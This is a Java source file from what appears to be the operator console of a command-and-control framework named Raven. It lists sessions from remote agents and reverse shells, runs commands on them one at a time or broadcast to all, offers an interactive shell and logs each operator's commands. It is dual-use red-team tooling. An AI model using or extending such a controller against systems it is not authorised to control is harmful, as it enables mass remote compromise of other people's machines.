package com.raven.interfaces.CLI.core.session;

import com.raven.utils.TerminalHelper;
import com.raven.core.database.TeamDatabase;
import com.raven.core.output.Logger;
import com.raven.core.server.RavenServer;
import com.raven.core.session.Session;
import com.raven.interfaces.CLI.module.log.LogManager;
import com.raven.utils.AnsiColor;
import com.raven.utils.SystemHelper;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.List;
import java.util.Map;
import java.util.Optional;

public final class SessionCommands {

    private final LogManager       LogManager;
    private final TeamDatabase     Database;

    private RavenServer Server;
    private String      OperatorName;
    private int         CurrentSessionId = -1;

    public SessionCommands(LogManager LogManager, TeamDatabase Database) {
        this.LogManager = LogManager;
        this.Database   = Database;
    }

    public void SetServer(RavenServer Server)    { this.Server       = Server; }
    public void SetOperator(String OperatorName) { this.OperatorName = OperatorName; }
    public int  GetCurrentSessionId()            { return CurrentSessionId; }

    public void ShowSessions() {
        System.out.println(TerminalHelper.Box("ACTIVE SESSIONS"));
        System.out.println();

        if (Server == null) {
            Logger.Info("running in cross-process mode - session list unavailable.");
            Logger.Info("use the primary operator terminal or webstart to view sessions.\n");
            return;
        }

        List<Session> Sessions = Server.GetSessions().GetAll();
        if (Sessions.isEmpty()) { Logger.Info("no active sessions\n"); return; }

        Logger.Custom("  %s%-5s %-14s %-14s %-16s %-10s %-10s %s%s%n",
            AnsiColor.Blue, "ID", "NAME/CERT", "TYPE", "IP", "OS", "USER", "SESSION-KEY", AnsiColor.Reset);
        System.out.println(TerminalHelper.Divider());

        for (Session ActiveSession : Sessions) {
            String DisplayName = ActiveSession.GetDisplayName();
            String OsLabel     = ActiveSession.GetOs();
            Logger.Custom("  %s#%-4d %-14s %-14s %-16s %-10s %-10s %s%s%n",
                AnsiColor.White,
                ActiveSession.GetId(),
                DisplayName.length() > 14 ? DisplayName.substring(0, 13) + "-" : DisplayName,
                ActiveSession.GetSessionType().name(),
                ActiveSession.GetAgentIp(),
                OsLabel.length() > 10 ? OsLabel.substring(0, 9) + "-" : OsLabel,
                ActiveSession.GetUser(),
                ActiveSession.GetSessionKey(),
                AnsiColor.Reset);
        }
        System.out.println();
    }

    public void ShowSessionInfo(int SessionId) {
        if (Server == null) { Logger.Info("unavailable in cross-process mode"); return; }
        Optional<Session> Found = Server.GetSessions().Get(SessionId);
        if (Found.isEmpty()) { Logger.Warn("session not found"); return; }
        Session ActiveSession = Found.get();

        System.out.println(TerminalHelper.Box("SESSION INFO - #" + SessionId));
        System.out.println();
        Logger.Custom("  %sID          %s%d%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.GetId());
        Logger.Custom("  %sName        %s%s%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.GetDisplayName());
        Logger.Custom("  %sType        %s%s%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.GetSessionType().name());
        Logger.Custom("  %sHostname    %s%s%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.GetHostname());
        Logger.Custom("  %sUser        %s%s%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.GetUser());
        Logger.Custom("  %sOS          %s%s%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.GetOs());
        Logger.Custom("  %sArch        %s%s%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.GetArch());
        Logger.Custom("  %sAgent IP    %s%s%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.GetAgentIp());
        Logger.Custom("  %sKey         %s%s%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.GetSessionKey());
        Logger.Custom("  %sEncrypted   %s%b%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.IsEncrypted());
        Logger.Custom("  %smTLS        %s%b%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.IsMtlsEnabled());
        Logger.Custom("  %sCert CN     %s%s%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.GetCertCn());
        Logger.Custom("  %sShell Mode  %s%s%n",          AnsiColor.Red, AnsiColor.White, ActiveSession.GetShellMode());
        String Note = Database.GetAgentNote(SessionId);
        Logger.Custom("  %sNote        %s%s%n",          AnsiColor.Red, AnsiColor.White, Note.isEmpty() ? "(none)" : Note);
        System.out.println();
    }

    public void ShowStats() {
        System.out.println(TerminalHelper.Box("SESSION STATISTICS"));
        System.out.println();
        if (Server == null) {
            Logger.Custom("  %sSessions %s(N/A - cross-process mode)%n", AnsiColor.Red, AnsiColor.White);
            System.out.println();
            return;
        }
        Map<String, Integer> Stats = Server.GetSessions().GetStats();
        Logger.Custom("  %sServer  %s%s:%d%n", AnsiColor.Red, AnsiColor.White, Server.GetHost(), Server.GetPort());
        Logger.Custom("  %sTotal   %s%d%n",    AnsiColor.Red, AnsiColor.White, Stats.get("Total"));
        Logger.Custom("  %sRaven   %s%d%n",    AnsiColor.Red, AnsiColor.White, Stats.get("RAVEN"));
        Logger.Custom("  %sRaw     %s%d%n",    AnsiColor.Red, AnsiColor.White, Stats.get("ReverseShell"));
        System.out.println();
    }

    public void Execute(int SessionId, String Command) {
        if (Server == null) { Logger.Warn("session commands unavailable in cross-process mode."); return; }
        String   Operator = OperatorName != null ? OperatorName : "operator";
        String[] Result   = Server.ExecuteCommand(SessionId, Command);
        boolean  Success  = Boolean.parseBoolean(Result[0]);

        if (Success) {
            System.out.println(TerminalHelper.OutputBox(Result[1]));
            LogManager.Add(AnsiColor.Green + "session-" + SessionId + " OK" + AnsiColor.Reset, false);
        } else {
            Logger.Info(Result[1]);
            LogManager.Add(AnsiColor.Red + "session-" + SessionId + " FAIL: " + Result[1] + AnsiColor.Reset, false);
        }
        Database.SaveCommandLog(SessionId, Operator, Command, Result[1], Success);
    }

    public void Broadcast(List<Integer> SessionIds, String Command) {
        if (Server == null) { Logger.Info("broadcast unavailable in cross-process mode."); return; }
        String Operator = OperatorName != null ? OperatorName : "operator";
        Logger.Custom("  broadcasting to %d session(s): %s%n", SessionIds.size(), Command);
        Map<Integer, String[]> Results = Server.BroadcastCommand(SessionIds, Command);
        System.out.println(TerminalHelper.Box("BROADCAST RESULTS - " + Results.size() + " sessions"));
        System.out.println();
        for (Map.Entry<Integer, String[]> Entry : Results.entrySet()) {
            boolean Success = Boolean.parseBoolean(Entry.getValue()[0]);
            Logger.Custom("  %ssession-%-3d %s%n", Success ? AnsiColor.Green : AnsiColor.Red, Entry.getKey(), AnsiColor.Reset);
            System.out.println(TerminalHelper.OutputBox(Entry.getValue()[1]));
            Database.SaveCommandLog(Entry.getKey(), Operator, Command, Entry.getValue()[1], Success);
        }
    }

    public void BroadcastAll(String Command) {
        if (Server == null) { Logger.Warn("unavailable in cross-process mode"); return; }
        int Total = Server.GetSessions().Count();
        if (Total == 0) { Logger.Info("no active sessions"); return; }
        String Operator = OperatorName != null ? OperatorName : "operator";
        Logger.Custom("  broadcasting to all %d session(s): %s%n", Total, Command);
        Map<Integer, String[]> Results = Server.BroadcastAll(Command);
        System.out.println(TerminalHelper.Box("BROADCAST-ALL RESULTS"));
        System.out.println();
        for (Map.Entry<Integer, String[]> Entry : Results.entrySet()) {
            boolean Success = Boolean.parseBoolean(Entry.getValue()[0]);
            Logger.Custom("  %ssession-%-3d %s%n", Success ? AnsiColor.Green : AnsiColor.Red, Entry.getKey(), AnsiColor.Reset);
            System.out.println(TerminalHelper.OutputBox(Entry.getValue()[1]));
            Database.SaveCommandLog(Entry.getKey(), Operator, Command, Entry.getValue()[1], Success);
        }
    }

    public void Interactive(int SessionId) {
        if (Server == null) { Logger.Warn("unavailable in cross-process mode"); return; }
        Optional<Session> Found = Server.GetSessions().Get(SessionId);
        if (Found.isEmpty()) { Logger.Warn("session not found"); return; }
        Session ActiveSession = Found.get();

        System.out.println(TerminalHelper.Box("INTERACTIVE SESSION"));
        Logger.Custom(
            "%n  %s[%s%s%s] %sID: %s%d %sUser: %s%s@%s %sOS: %s%s %sArch: %s%s %sIP: %s%s %sType: %s%s %sKey: %s%s%s%n",
            AnsiColor.Blue, AnsiColor.White, ActiveSession.GetDisplayName(), AnsiColor.Blue,
            AnsiColor.Blue, AnsiColor.White, SessionId,
            AnsiColor.Blue, AnsiColor.White, ActiveSession.GetUser(), ActiveSession.GetHostname(),
            AnsiColor.Blue, AnsiColor.White, ActiveSession.GetOs(),
            AnsiColor.Blue, AnsiColor.White, ActiveSession.GetArch(),
            AnsiColor.Blue, AnsiColor.White, ActiveSession.GetAgentIp(),
            AnsiColor.Blue, AnsiColor.White, ActiveSession.GetSessionType(),
            AnsiColor.Blue, AnsiColor.White, ActiveSession.GetSessionKey(),
            AnsiColor.Reset);
        Logger.Info("type 'back' to return");
        LogManager.Add(AnsiColor.Blue + "entered [" + ActiveSession.GetDisplayName() + "] session-" + SessionId + AnsiColor.Reset, false);

        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        CurrentSessionId = SessionId;

        while (CurrentSessionId == SessionId) {
            try {
                Logger.Custom("%n  %s[%s%s#%d%s%s]%s ~$ %s",
                    AnsiColor.Blue, AnsiColor.White, ActiveSession.GetDisplayName(),
                    SessionId, AnsiColor.Blue, AnsiColor.White, AnsiColor.Blue, AnsiColor.Reset);
                String Command = Reader.readLine();
                if (Command == null || Command.trim().isEmpty()) continue;
                Command = Command.trim();
                if (Command.equalsIgnoreCase("back"))  { CurrentSessionId = -1; Logger.Info("returned to main console"); break; }
                if (Command.equalsIgnoreCase("clear")) { SystemHelper.ClearScreen(); continue; }
                LogManager.Add(AnsiColor.Blue + "[" + ActiveSession.GetDisplayName() + "]: " + Command + AnsiColor.Reset, false);
                Execute(SessionId, Command);
            } catch (IOException Exception) {
                break;
            }
        }
    }

    public void Kill(int SessionId) {
        if (Server == null) { Logger.Warn("unavailable in cross-process mode"); return; }
        Optional<Session> Found = Server.GetSessions().Get(SessionId);
        if (Found.isEmpty()) { Logger.Warn("session not found"); return; }
        String DisplayName = Found.get().GetDisplayName();
        Server.RemoveSession(SessionId);
        Logger.Custom("  session-%d [%s] terminated%n", SessionId, DisplayName);
        LogManager.Add(AnsiColor.Green + "session-" + SessionId + " [" + DisplayName + "] killed" + AnsiColor.Reset, false);
    }

    public void ShowTasksQueue() {
        System.out.println(TerminalHelper.Box("PENDING TASKS"));
        System.out.println();
        int Total = Server != null ? Server.GetSessions().Count() : 0;
        Logger.Custom("  %sActive sessions: %s%d%s%n", AnsiColor.Red, AnsiColor.White, Total, AnsiColor.Reset);
        Logger.Info("  use 'broadcast' or 'exec' to queue commands to sessions");
        System.out.println();
    }
}
